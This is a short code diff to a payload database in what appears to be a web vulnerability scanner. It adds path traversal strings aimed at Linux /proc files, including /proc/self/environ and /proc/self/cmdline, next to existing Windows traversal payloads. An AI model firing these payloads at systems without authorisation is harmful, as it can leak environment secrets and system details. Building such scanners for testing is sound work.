@@ -341,6 +341,17 @@ class PayloadDB:
         # Windows
         '..\\..\\..\\windows\\win.ini',
         '..\\..\\..\\boot.ini',
+        # /proc/* files (Linux system info)
+        '/proc/version',
+        '../proc/version',
+        '../../proc/version',
+        '../../../proc/version',
+        '../../../../proc/version',
+        '/../../../../../../../../../../proc/version',  # Acunetix style
+        '/proc/cpuinfo',
+        '/proc/meminfo',
+        '/proc/self/environ',
+        '/proc/self/cmdline',
     ]
 
     # SQL error patterns for error-based detection
